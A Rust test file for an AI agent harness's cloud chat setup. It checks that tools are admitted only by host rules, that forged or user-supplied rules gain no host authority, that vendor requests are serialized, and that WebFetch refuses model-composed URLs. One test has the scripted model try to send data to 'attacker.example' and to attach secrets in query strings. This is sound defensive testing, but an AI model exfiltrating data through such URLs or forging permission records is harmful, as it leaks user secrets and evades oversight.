//! The cloud's composition of a Chat without a Folder: `ToolPolicy::durable_chat`, durable waits,
//! Auto without a reviewer, a host that denies whatever would prompt, and the host's rules. Every
//! tool the model is offered is admitted by a rule or by its own class, never by review or a
//! prompt; the host's rules are a source of their own that no user rule or record can edit or
//! forge, and the requests to the model's vendor pass the host's gates one at a time.

use std::collections::BTreeSet;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use async_trait::async_trait;
use serde_json::{Value, json};
use tickloop_agent_model::{ModelClient, ModelDelta, ModelError, ModelOutput, ModelRequest};
use tickloop_agent_protocol::{
    AgentHostOptions, ChatId, Content, Decision, EventKind, OperationState, PermissionRule,
    PromptPolicy, QuestionAnswer, Role, SUBAGENT_TOOL_NAME, Usage,
};
use tickloop_agent_runtime::transcript::{StorePosition, TranscriptStore};
use tickloop_agent_runtime::{
    Agent, Delivery, HarnessOptions, HarnessSeams, ParentSelection, QuestionReply, Quiescence,
    ToolPolicy, TurnOp, TurnRequest, UserMessage, WaitHosting, durable_chat_host_rules,
    mcp_tools::McpHostToolProvider,
};
use tickloop_agent_test_support::harness::ChosenModels;
use tickloop_agent_test_support::routed::{RoutedModel, has_tool_result, tool_result};
use tickloop_agent_test_support::transcripts::InMemoryTranscriptStore;
use tickloop_agent_test_support::{call, config, single_question, text};
use tickloop_agent_tools::permissions::{PermissionPolicyExt, RuleSource};
use tickloop_agent_transcript::{Line, SettledOutcome};
use tokio_util::sync::CancellationToken;
use uuid::Uuid;

use super::mcp_tools::artifact_service::ArtifactService;

const WAIT: Duration = Duration::from_secs(20);
const ROOT_PROMPT: &str = "Use every tool you have once.";
const CHILD_TASK: &str = "Check the delivery date and report back.";
const QUEUED_GOAL: &str = "Draft the release note.";
const SCHEDULED_GOAL: &str = "Summarize the news.";
const CLOUD_MIN_SCHEDULE_INTERVAL: Duration = Duration::from_secs(60);

/// The cloud's composition: what the private host configures for every Harness.
fn cloud_options(host_rules: Vec<PermissionRule>) -> HarnessOptions {
    HarnessOptions {
        model: config(),
        settings: None,
        host: AgentHostOptions {
            prompt_policy: PromptPolicy::DenyOnPrompt,
            ..AgentHostOptions::product_defaults()
        },
        tools: ToolPolicy::durable_chat(),
        host_rules,
        task_tools: Some(true),
        min_schedule_interval: CLOUD_MIN_SCHEDULE_INTERVAL,
        waits: WaitHosting::Durable,
        system_prompt_addition: None,
        request_gates: Vec::new(),
    }
}

fn cloud_harness(
    store: Arc<dyn TranscriptStore>,
    model: Arc<dyn ModelClient>,
    options: HarnessOptions,
) -> Agent {
    Agent::with_seams(
        HarnessSeams {
            transcripts: Some(store),
            environment: None,
            models: ChosenModels::new(model),
        },
        options,
    )
    .unwrap()
}

fn prompt(text: &str) -> TurnRequest {
    TurnRequest {
        input_id: Uuid::new_v4(),
        op: TurnOp::Continue {
            after: ParentSelection::CurrentLeaf,
            target_loop: None,
            message: UserMessage {
                text: text.into(),
                ..Default::default()
            },
        },
        delivery: Delivery::Queue,
        host_context: None,
    }
}

/// Whether the request belongs to the Chat whose first prompt contains `marker`.
fn starts_with_prompt(request: &ModelRequest, marker: &str) -> bool {
    request
        .messages
        .iter()
        .find(|message| message.role == Role::User)
        .is_some_and(|message| {
            message
                .content
                .iter()
                .any(|content| matches!(content, Content::Text { text } if text.contains(marker)))
        })
}

/// A page server on the loopback interface that answers every request with the same page.
async fn page_server() -> String {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tokio::spawn(async move {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        while let Ok((mut socket, _)) = listener.accept().await {
            tokio::spawn(async move {
                let mut request = Vec::new();
                let mut buffer = [0; 1024];
                while !request.windows(4).any(|bytes| bytes == b"\r\n\r\n") {
                    let Ok(length) = socket.read(&mut buffer).await else {
                        return;
                    };
                    if length == 0 {
                        return;
                    }
                    request.extend_from_slice(&buffer[..length]);
                }
                let body = "<p>Delivery is on Friday.</p>";
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                    body.len()
                );
                let _ = socket.write_all(response.as_bytes()).await;
            });
        }
    });
    format!("http://localhost:{port}/delivery")
}

/// The root calls each of its tools once, in this order, then finishes; the child hands back.
fn every_tool_model(page: String) -> Arc<RoutedModel> {
    Arc::new(RoutedModel::new(move |request| {
        // WebFetch asks the Chat's model about the page it fetched.
        if request.tools.is_empty() {
            return text("Delivery is on Friday.");
        }
        if starts_with_prompt(request, CHILD_TASK) {
            return if has_tool_result(request, "handback") {
                text("Nothing more.")
            } else {
                call(
                    "handback",
                    "SubagentHandback",
                    json!({"message": "Delivery is on Friday."}),
                )
            };
        }
        if !starts_with_prompt(request, ROOT_PROMPT)
            || request
                .messages
                .last()
                .is_some_and(|message| format!("{:?}", message.content).contains(QUEUED_GOAL))
        {
            return text("Done.");
        }
        let task = tool_result(&request.messages, "create").map(|result| result["task"].clone());
        let steps: Vec<(&str, &str, Value)> = vec![
            (
                "fetch",
                "WebFetch",
                json!({"url": page, "prompt": "When is the delivery?"}),
            ),
            (
                "create",
                "TaskCreate",
                json!({"mutation_id": Uuid::from_u128(1), "title": "Check", "description": "Check the delivery"}),
            ),
            ("list", "TaskList", json!({})),
            (
                "get",
                "TaskGet",
                json!({"task_id": task.as_ref().map(|task| task["id"].clone())}),
            ),
            (
                "claim",
                "TaskUpdate",
                json!({"mutation_id": Uuid::from_u128(2), "task_id": task.as_ref().map(|task| task["id"].clone()), "expected_revision": 1, "action": "claim"}),
            ),
            ("goal", "StartGoal", json!({"goal": QUEUED_GOAL})),
            (
                "schedule",
                "StartGoal",
                json!({"goal": SCHEDULED_GOAL, "schedule": "every 1h"}),
            ),
            (
                "delegate",
                SUBAGENT_TOOL_NAME,
                json!({"task": CHILD_TASK, "name": "helper"}),
            ),
            ("members", "ListSubagents", json!({})),
            (
                "message",
                "SendMessage",
                json!({"to": "helper", "message": "Thanks."}),
            ),
            ("stop", "StopSubagent", json!({"to": "helper"})),
            (
                "read",
                "ArtifactRead",
                json!({"action": "read", "artifact_id": "doc"}),
            ),
            (
                "patch",
                "ArtifactEdit",
                json!({"action": "patch", "artifact_id": "doc", "patches": [{"type": "replace", "target": "b1", "expected_hash": "h1", "text": "# Friday"}]}),
            ),
            (
                "reply",
                "ArtifactComment",
                json!({"action": "reply", "artifact_id": "doc", "thread_id": "thread-1", "text": "Friday"}),
            ),
            ("ask", "AskUserQuestion", single_question("Which format?")),
        ];
        for (id, name, input) in steps {
            if !has_tool_result(request, id) {
                return call(id, name, input);
            }
        }
        text("All tools used.")
    }))
}

/// Records whether any call was reviewed or put to a person.
fn watch_admissions(agent: &Agent) -> Arc<Mutex<Vec<String>>> {
    let seen = Arc::new(Mutex::new(Vec::new()));
    let mut events = agent.subscribe();
    let recorded = seen.clone();
    tokio::spawn(async move {
        loop {
            match events.recv().await {
                Ok(event) => match event.kind {
                    EventKind::ApprovalAssessed { assessment } => recorded
                        .lock()
                        .unwrap()
                        .push(format!("assessed {}", assessment.call_id)),
                    EventKind::PermissionRequested { request } => recorded
                        .lock()
                        .unwrap()
                        .push(format!("asked {}", request.name)),
                    _ => {}
                },
                Err(tokio::sync::broadcast::error::RecvError::Lagged(_)) => {
                    recorded.lock().unwrap().push("lagged".into())
                }
                Err(tokio::sync::broadcast::error::RecvError::Closed) => break,
            }
        }
    });
    seen
}

async fn eventually<T>(mut probe: impl AsyncFnMut() -> Option<T>) -> T {
    tokio::time::timeout(WAIT, async {
        loop {
            if let Some(found) = probe().await {
                return found;
            }
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    })
    .await
    .expect("the condition was reached")
}

/// Every tool a cloud Chat offers its model is admitted by a rule or its own class, never by a
/// prompt: WebFetch of a URL the user gave and the Subagent call by the host's rules. Only the
/// writes to the user's Artifacts go to review, which a Chat without a Folder cannot hold yet, so
/// they are refused and reach no service.
#[tokio::test]
async fn every_catalog_tool_is_admitted_and_only_artifact_writes_are_reviewed_under_the_cloud_composition()
 {
    let service = ArtifactService::start().await;
    let credentials = tempfile::tempdir().unwrap();
    let account = service.login(credentials.path()).await;
    let page = page_server().await;
    let model = every_tool_model(page.clone());
    let store = Arc::new(InMemoryTranscriptStore::new());
    let agent = cloud_harness(
        store,
        model.clone(),
        HarnessOptions {
            // The page server listens on the loopback interface.
            tools: ToolPolicy {
                folderless_reach: tickloop_agent_base::network::Reach::Anywhere,
                ..ToolPolicy::durable_chat()
            },
            ..cloud_options(durable_chat_host_rules())
        },
    );
    agent
        .install_host_tools(Arc::new(McpHostToolProvider::new(account, None)))
        .unwrap();
    let admissions = watch_admissions(&agent);
    let root = agent.create_chat_without_folder().await.unwrap();
    let request = prompt(&format!("{ROOT_PROMPT} The delivery page is {page}."));
    agent.advance(root, request.clone()).await.unwrap();
    let question = eventually(async || {
        agent
            .snapshot(root)
            .await
            .unwrap()
            .questions
            .first()
            .cloned()
    })
    .await;
    agent
        .advance(
            root,
            TurnRequest {
                input_id: Uuid::new_v4(),
                op: TurnOp::Answer {
                    request: question.id,
                    reply: QuestionReply::Answered(vec![QuestionAnswer::other("Weekly")]),
                },
                delivery: Delivery::Queue,
                host_context: None,
            },
        )
        .await
        .unwrap();
    assert!(matches!(
        tokio::time::timeout(WAIT, agent.settled_input(root, request.input_id))
            .await
            .unwrap()
            .unwrap(),
        SettledOutcome::Completed { .. }
    ));

    let offered = model
        .requests
        .lock()
        .unwrap()
        .iter()
        .find(|request| starts_with_prompt(request, ROOT_PROMPT) && !request.tools.is_empty())
        .unwrap()
        .tools
        .iter()
        .map(|tool| tool.name.clone())
        .collect::<BTreeSet<_>>();
    let snapshot = agent.snapshot(root).await.unwrap();
    let called = snapshot
        .operations
        .iter()
        .map(|operation| operation.name.clone())
        .collect::<BTreeSet<_>>();
    assert_eq!(offered, called, "the root called every tool it was offered");
    const REVIEWED: [&str; 2] = ["ArtifactEdit", "ArtifactComment"];
    for operation in &snapshot.operations {
        let expected = if REVIEWED.contains(&operation.name.as_str()) {
            OperationState::Failed
        } else {
            OperationState::Completed
        };
        assert_eq!(
            operation.state, expected,
            "{} {:?}",
            operation.name, operation.result
        );
    }
    assert_eq!(
        *admissions.lock().unwrap(),
        ["assessed patch", "assessed reply"],
        "only the Artifact writes went to review, and nobody was asked"
    );
    let denied = agent
        .recent_denials(root)
        .await
        .unwrap()
        .records
        .into_iter()
        .map(|record| record.tool)
        .collect::<BTreeSet<_>>();
    assert_eq!(denied, REVIEWED.map(String::from).into());
    for member in agent.subagents(root).await.unwrap() {
        assert!(
            agent
                .recent_denials(member.child_chat_id)
                .await
                .unwrap()
                .records
                .is_empty()
        );
    }
    let calls = service
        .tool_calls()
        .iter()
        .map(|call| call["name"].as_str().unwrap().to_owned())
        .collect::<Vec<_>>();
    assert_eq!(calls, ["ArtifactRead"]);
    agent.shutdown().await;
}

fn subagent_model() -> Arc<RoutedModel> {
    Arc::new(RoutedModel::new(|request| {
        if starts_with_prompt(request, CHILD_TASK) {
            return if has_tool_result(request, "handback") {
                text("Nothing more.")
            } else {
                call(
                    "handback",
                    "SubagentHandback",
                    json!({"message": "Delivery is on Friday."}),
                )
            };
        }
        if has_tool_result(request, "delegate") {
            text("Delegated.")
        } else {
            call(
                "delegate",
                SUBAGENT_TOOL_NAME,
                json!({"task": CHILD_TASK, "name": "helper"}),
            )
        }
    }))
}

/// The text of the Subagent call's result.
fn subagent_result(agent_snapshot: &tickloop_agent_protocol::ChatSnapshot) -> String {
    agent_snapshot
        .messages
        .iter()
        .flat_map(|message| &message.content)
        .find_map(|content| match content {
            Content::ToolResult {
                tool_use_id,
                content,
                ..
            } if tool_use_id == "delegate" => Some(content.text().into_owned()),
            _ => None,
        })
        .expect("the Subagent call has a result")
}

/// A user rule that borrows a host rule's id is still the user's: under Auto it does not spare a
/// Subagent call its review, and with no reviewer and no person the call is refused. Replacing
/// the user's rules leaves the host's untouched.
#[tokio::test]
async fn a_user_rule_with_a_host_rules_id_is_reviewed_and_cannot_replace_the_hosts_rules() {
    let without_subagent = durable_chat_host_rules()
        .into_iter()
        .filter(|rule| rule.tool != SUBAGENT_TOOL_NAME)
        .collect::<Vec<_>>();
    let subagent_rule = durable_chat_host_rules()
        .into_iter()
        .find(|rule| rule.tool == SUBAGENT_TOOL_NAME)
        .unwrap();
    let store = Arc::new(InMemoryTranscriptStore::new());
    let agent = cloud_harness(
        store,
        subagent_model(),
        cloud_options(without_subagent.clone()),
    );
    let admissions = watch_admissions(&agent);
    let root = agent.create_chat_without_folder().await.unwrap();
    agent
        .set_permission_rules(root, vec![subagent_rule.clone()])
        .await
        .unwrap();
    let policy = agent.snapshot(root).await.unwrap().policy;
    assert_eq!(
        policy
            .host_rules
            .iter()
            .map(|rule| rule.id)
            .collect::<Vec<_>>(),
        without_subagent
            .iter()
            .map(|rule| rule.id)
            .collect::<Vec<_>>(),
        "replacing the user's rules leaves the host's"
    );
    assert_eq!(
        policy
            .explicit_rule_match(SUBAGENT_TOOL_NAME, &json!({}), Uuid::nil(), None)
            .unwrap()
            .source,
        RuleSource::User
    );
    let request = prompt("Delegate the check.");
    agent.advance(root, request.clone()).await.unwrap();
    tokio::time::timeout(WAIT, agent.settled_input(root, request.input_id))
        .await
        .unwrap()
        .unwrap();
    let snapshot = agent.snapshot(root).await.unwrap();
    assert!(agent.subagents(root).await.unwrap().is_empty());
    assert!(
        admissions
            .lock()
            .unwrap()
            .iter()
            .any(|seen| seen.starts_with("assessed")),
        "the user's Allow went to review"
    );
    let denials = agent.recent_denials(root).await.unwrap().records;
    assert_eq!(denials.len(), 1, "{denials:?}");
    assert!(
        subagent_result(&snapshot).contains("no Folder to review"),
        "{}",
        subagent_result(&snapshot)
    );
    agent.shutdown().await;

    // With the host's own rule, the same call is admitted without review.
    let store = Arc::new(InMemoryTranscriptStore::new());
    let agent = cloud_harness(
        store,
        subagent_model(),
        cloud_options(durable_chat_host_rules()),
    );
    let admissions = watch_admissions(&agent);
    let root = agent.create_chat_without_folder().await.unwrap();
    let request = prompt("Delegate the check.");
    agent.advance(root, request.clone()).await.unwrap();
    assert!(matches!(
        tokio::time::timeout(WAIT, agent.settled_input(root, request.input_id))
            .await
            .unwrap()
            .unwrap(),
        SettledOutcome::Completed { .. }
    ));
    assert_eq!(agent.subagents(root).await.unwrap().len(), 1);
    assert!(admissions.lock().unwrap().is_empty());
    agent.shutdown().await;
}

/// A user's Deny still tightens the host's Allow.
#[tokio::test]
async fn a_user_deny_tightens_the_hosts_allow() {
    let store = Arc::new(InMemoryTranscriptStore::new());
    let agent = cloud_harness(
        store,
        subagent_model(),
        cloud_options(durable_chat_host_rules()),
    );
    let root = agent.create_chat_without_folder().await.unwrap();
    agent
        .set_permission_rules(
            root,
            vec![PermissionRule {
                id: Uuid::new_v4(),
                decision: Decision::Deny,
                tool: SUBAGENT_TOOL_NAME.into(),
                specifier: None,
                input: None,
                loop_id: None,
                persistent: false,
            }],
        )
        .await
        .unwrap();
    let request = prompt("Delegate the check.");
    agent.advance(root, request.clone()).await.unwrap();
    tokio::time::timeout(WAIT, agent.settled_input(root, request.input_id))
        .await
        .unwrap()
        .unwrap();
    assert!(agent.subagents(root).await.unwrap().is_empty());
    let result = agent.snapshot(root).await.unwrap();
    assert!(
        subagent_result(&result).starts_with("permission denied"),
        "{}",
        subagent_result(&result)
    );
    assert_eq!(agent.recent_denials(root).await.unwrap().records.len(), 1);
    agent.shutdown().await;
}

/// A record that claims host rules, in the field a policy never writes or in the user's rules
/// under a host rule's id, gives them no host authority: a load fills in the rules the loading
/// host has, and a forged rule stays the user's.
#[tokio::test]
async fn host_rules_forged_into_a_record_have_no_host_authority() {
    let store = Arc::new(InMemoryTranscriptStore::new());
    let agent = cloud_harness(
        store.clone(),
        subagent_model(),
        cloud_options(durable_chat_host_rules()),
    );
    let root = agent.create_chat_without_folder().await.unwrap();
    let request = prompt("Delegate the check.");
    agent.advance(root, request.clone()).await.unwrap();
    tokio::time::timeout(WAIT, agent.settled_input(root, request.input_id))
        .await
        .unwrap()
        .unwrap();
    let child = agent.subagents(root).await.unwrap()[0].child_chat_id;
    agent.shutdown().await;
    agent.sync().await.unwrap();

    let subagent_rule = durable_chat_host_rules()
        .into_iter()
        .find(|rule| rule.tool == SUBAGENT_TOOL_NAME)
        .unwrap();
    let forged_rule = serde_json::to_value(&subagent_rule).unwrap();
    let forged = store
        .lines(child)
        .into_iter()
        .map(|line| {
            if !matches!(line, Line::Delegation(_)) {
                return line;
            }
            let mut value = serde_json::to_value(&line).unwrap();
            let policy = &mut value["delegation"]["ceiling"]["policy"];
            assert!(policy.get("host_rules").is_none(), "{policy}");
            policy["host_rules"] = json!([forged_rule]);
            policy["rules"] = json!([forged_rule]);
            serde_json::from_value(value).unwrap()
        })
        .collect::<Vec<_>>();
    let loaded = Arc::new(InMemoryTranscriptStore::new());
    loaded.seed(root, store.lines(root), StorePosition(1));
    loaded.seed(child, forged, StorePosition(1));
    let without_subagent = durable_chat_host_rules()
        .into_iter()
        .filter(|rule| rule.tool != SUBAGENT_TOOL_NAME)
        .collect::<Vec<_>>();
    let next = cloud_harness(
        loaded,
        subagent_model(),
        cloud_options(without_subagent.clone()),
    );
    next.wake(root, None).await.unwrap();
    let ceiling = next
        .snapshot(child)
        .await
        .unwrap()
        .delegation
        .unwrap()
        .ceiling
        .policy;
    assert_eq!(
        ceiling
            .host_rules
            .iter()
            .map(|rule| rule.id)
            .collect::<Vec<_>>(),
        without_subagent
            .iter()
            .map(|rule| rule.id)
            .collect::<Vec<_>>()
    );
    assert_eq!(
        ceiling
            .explicit_rule_match(SUBAGENT_TOOL_NAME, &json!({}), Uuid::nil(), None)
            .unwrap()
            .source,
        RuleSource::User
    );
    next.shutdown().await;
}

/// Answers every request after a short while, counting how many are in flight at once.
struct CountingModel {
    in_flight: AtomicUsize,
    most_in_flight: AtomicUsize,
    requests: AtomicUsize,
}

#[async_trait]
impl ModelClient for CountingModel {
    async fn generate_title(
        &self,
        request: ModelRequest,
        _: tokio::sync::mpsc::UnboundedSender<ModelDelta>,
        _: CancellationToken,
    ) -> Result<ModelOutput, ModelError> {
        Ok(tickloop_agent_test_support::title_output(request))
    }

    fn identity(&self) -> tickloop_agent_protocol::ModelIdentity {
        tickloop_agent_test_support::ScriptedModel::new(vec![]).identity()
    }

    async fn complete(
        &self,
        _: ModelRequest,
        _: tokio::sync::mpsc::UnboundedSender<ModelDelta>,
        _: CancellationToken,
    ) -> Result<ModelOutput, ModelError> {
        let now = self.in_flight.fetch_add(1, Ordering::SeqCst) + 1;
        self.most_in_flight.fetch_max(now, Ordering::SeqCst);
        tokio::time::sleep(Duration::from_millis(20)).await;
        self.in_flight.fetch_sub(1, Ordering::SeqCst);
        self.requests.fetch_add(1, Ordering::SeqCst);
        Ok(ModelOutput {
            private_source: None,
            content: text("summary"),
            usage: Usage::default(),
            stop_reason: "end_turn".into(),
        })
    }
}

/// Four Chats answer and then compact at once behind a holding's gate of four and a node's gate
/// of one: each request to the vendor takes the gates for itself alone, so the requests go one
/// at a time and none waits on a permit another of its own holds.
#[tokio::test]
async fn compactions_behind_the_hosts_request_gates_go_one_at_a_time_without_deadlock() {
    let model = Arc::new(CountingModel {
        in_flight: AtomicUsize::new(0),
        most_in_flight: AtomicUsize::new(0),
        requests: AtomicUsize::new(0),
    });
    let agent = cloud_harness(
        Arc::new(InMemoryTranscriptStore::new()),
        model.clone(),
        HarnessOptions {
            request_gates: vec![
                Arc::new(tokio::sync::Semaphore::new(4)),
                Arc::new(tokio::sync::Semaphore::new(1)),
            ],
            ..cloud_options(durable_chat_host_rules())
        },
    );
    let mut chats: Vec<ChatId> = Vec::new();
    for _ in 0..4 {
        chats.push(agent.create_chat_without_folder().await.unwrap());
    }
    let turns = chats.iter().map(|chat| {
        let agent = agent.clone();
        let chat = *chat;
        async move {
            let request = prompt("Summarize the week.");
            agent.advance(chat, request.clone()).await.unwrap();
            agent.settled_input(chat, request.input_id).await.unwrap();
            agent.compact(chat).await.unwrap();
        }
    });
    tokio::time::timeout(WAIT, futures_util::future::join_all(turns))
        .await
        .expect("no request waits on a permit its own Run holds");
    assert_eq!(model.most_in_flight.load(Ordering::SeqCst), 1);
    assert!(model.requests.load(Ordering::SeqCst) >= 8);
    for chat in chats {
        assert_eq!(agent.quiesce(chat).await, Quiescence::Idle);
    }
    agent.shutdown().await;
}

/// Serves each path its own response: `(path, status line and headers, body)`; any other path is
/// not found.
async fn site(routes: Vec<(&'static str, String, String)>) -> String {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let routes = Arc::new(routes);
    tokio::spawn(async move {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        while let Ok((mut socket, _)) = listener.accept().await {
            let routes = routes.clone();
            tokio::spawn(async move {
                let mut request = Vec::new();
                let mut buffer = [0; 1024];
                while !request.windows(4).any(|bytes| bytes == b"\r\n\r\n") {
                    let Ok(length) = socket.read(&mut buffer).await else {
                        return;
                    };
                    if length == 0 {
                        return;
                    }
                    request.extend_from_slice(&buffer[..length]);
                }
                let request = String::from_utf8_lossy(&request);
                let target = request.split_whitespace().nth(1).unwrap_or("/");
                let path = target.split('?').next().unwrap_or(target).to_owned();
                let (head, body) = routes
                    .iter()
                    .find(|(route, _, _)| *route == path)
                    .map(|(_, head, body)| (head.clone(), body.clone()))
                    .unwrap_or_else(|| ("404 Not Found".into(), String::new()));
                let content_type = if head.contains("Content-Type") {
                    ""
                } else {
                    "\r\nContent-Type: text/html"
                };
                let response = format!(
                    "HTTP/1.1 {head}{content_type}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                    body.len()
                );
                let _ = socket.write_all(response.as_bytes()).await;
            });
        }
    });
    format!("http://localhost:{port}")
}

/// Fetches each URL in turn, one call per step, then finishes.
fn fetching_model(urls: Vec<String>) -> Arc<RoutedModel> {
    Arc::new(RoutedModel::new(move |request| {
        if request.tools.is_empty() {
            return text("Read.");
        }
        for (index, url) in urls.iter().enumerate() {
            let id = format!("fetch-{index}");
            if !has_tool_result(request, &id) {
                return call(&id, "WebFetch", json!({"url": url, "prompt": "Summarize."}));
            }
        }
        text("Done.")
    }))
}

/// The text and error flag of each call's result, in call order.
fn fetch_results(
    snapshot: &tickloop_agent_protocol::ChatSnapshot,
    calls: usize,
) -> Vec<(String, bool)> {
    (0..calls)
        .map(|index| {
            let id = format!("fetch-{index}");
            snapshot
                .messages
                .iter()
                .flat_map(|message| &message.content)
                .find_map(|content| match content {
                    Content::ToolResult {
                        tool_use_id,
                        content,
                        is_error,
                    } if *tool_use_id == id => Some((content.text().into_owned(), *is_error)),
                    _ => None,
                })
                .unwrap_or_else(|| panic!("{id} has a result"))
        })
        .collect()
}

/// A cloud Chat whose WebFetch reaches the loopback interface, where the test's sites listen.
fn fetching_harness(model: Arc<RoutedModel>, host_rules: Vec<PermissionRule>) -> Agent {
    cloud_harness(
        Arc::new(InMemoryTranscriptStore::new()),
        model,
        HarnessOptions {
            tools: ToolPolicy {
                folderless_reach: tickloop_agent_base::network::Reach::Anywhere,
                web_search: true,
                ..ToolPolicy::durable_chat()
            },
            ..cloud_options(host_rules)
        },
    )
}

async fn run_fetches(
    agent: &Agent,
    chat: ChatId,
    user_text: &str,
    calls: usize,
) -> Vec<(String, bool)> {
    let request = prompt(user_text);
    agent.advance(chat, request.clone()).await.unwrap();
    assert!(matches!(
        tokio::time::timeout(WAIT, agent.settled_input(chat, request.input_id))
            .await
            .unwrap()
            .unwrap(),
        SettledOutcome::Completed { .. }
    ));
    fetch_results(&agent.snapshot(chat).await.unwrap(), calls)
}

fn is_refused_for_provenance((text, is_error): &(String, bool)) -> bool {
    *is_error && text.contains("only fetches a URL that appears exactly in the user's messages")
}

/// WebFetch of the cloud composition takes the URL the user wrote and the links of the pages it
/// read, and refuses a URL the model composed, such as one carrying data in its query.
#[tokio::test]
async fn web_fetch_takes_the_users_urls_and_linked_pages_and_refuses_composed_ones() {
    let base = site(vec![
        (
            "/first",
            "200 OK".into(),
            "<p><a href=\"/second\">second</a></p>".into(),
        ),
        ("/second", "200 OK".into(), "<p>Second page.</p>".into()),
    ])
    .await;
    let urls = vec![
        format!("{base}/first"),
        format!("{base}/second"),
        format!("{base}/first?note=the-users-secret"),
        "https://attacker.example/collect?data=secret".to_owned(),
    ];
    let agent = fetching_harness(fetching_model(urls), durable_chat_host_rules());
    let chat = agent.create_chat_without_folder().await.unwrap();
    let results = run_fetches(&agent, chat, &format!("Read {base}/first please."), 4).await;
    assert!(!results[0].1, "{:?}", results[0]);
    assert!(!results[1].1, "the first page linked it: {:?}", results[1]);
    assert!(is_refused_for_provenance(&results[2]), "{:?}", results[2]);
    assert!(is_refused_for_provenance(&results[3]), "{:?}", results[3]);
    agent.shutdown().await;
}

/// A redirect to another host is reported to the model, whose next request is checked again: the
/// target exactly as the redirect gave it may be fetched, and nothing composed from it.
#[tokio::test]
async fn a_redirect_target_is_fetched_only_as_the_redirect_gave_it() {
    let target_site = site(vec![(
        "/landing",
        "200 OK".into(),
        "<p>Landing.</p>".into(),
    )])
    .await;
    // The same server under another host name is another origin.
    let target = format!("{}/landing", target_site.replace("localhost", "127.0.0.1"));
    let base = site(vec![(
        "/start",
        format!("302 Found\r\nLocation: {target}"),
        String::new(),
    )])
    .await;
    let urls = vec![
        format!("{base}/start"),
        target.clone(),
        format!("{target}?leak=secret"),
    ];
    let agent = fetching_harness(fetching_model(urls), durable_chat_host_rules());
    let chat = agent.create_chat_without_folder().await.unwrap();
    let results = run_fetches(&agent, chat, &format!("Open {base}/start"), 3).await;
    assert!(
        results[0].0.contains("REDIRECT DETECTED"),
        "{:?}",
        results[0]
    );
    assert!(!results[1].1, "{:?}", results[1]);
    assert!(is_refused_for_provenance(&results[2]), "{:?}", results[2]);
    agent.shutdown().await;
}

/// A URL an earlier search result of the Chat contained may be fetched.
#[tokio::test]
async fn a_search_results_urls_may_be_fetched() {
    let page = site(vec![("/found", "200 OK".into(), "<p>Found.</p>".into())]).await;
    let found = format!("{page}/found");
    let results_body =
        json!({"results": [{"title": "Found", "url": found, "content": "A page"}]}).to_string();
    let search = site(vec![(
        "/search",
        "200 OK\r\nContent-Type: application/json".into(),
        results_body,
    )])
    .await;
    let searched = found.clone();
    let model = Arc::new(RoutedModel::new(move |request| {
        if request.tools.is_empty() {
            return text("Read.");
        }
        if !has_tool_result(request, "search") {
            return call("search", "WebSearch", json!({"query": "delivery"}));
        }
        for (id, url) in [
            ("fetch-0", searched.clone()),
            ("fetch-1", format!("{searched}?x=1")),
        ] {
            if !has_tool_result(request, id) {
                return call(id, "WebFetch", json!({"url": url, "prompt": "Summarize."}));
            }
        }
        text("Done.")
    }));
    let mut host_rules = durable_chat_host_rules();
    host_rules.push(PermissionRule {
        id: Uuid::new_v4(),
        decision: Decision::Allow,
        tool: "WebSearch".into(),
        specifier: None,
        input: None,
        loop_id: None,
        persistent: false,
    });
    let agent = fetching_harness(model, host_rules);
    let chat = agent.create_chat_without_folder().await.unwrap();
    agent
        .set_search(
            chat,
            Some(tickloop_agent_protocol::SearchConfig {
                provider: tickloop_agent_protocol::SearchProviderKind::Searxng,
                endpoint: format!("{search}/search"),
                api_key_env: None,
            }),
        )
        .await
        .unwrap();
    let results = run_fetches(&agent, chat, "Search for the delivery page.", 2).await;
    assert!(!results[0].1, "{:?}", results[0]);
    assert!(is_refused_for_provenance(&results[1]), "{:?}", results[1]);
    agent.shutdown().await;
}
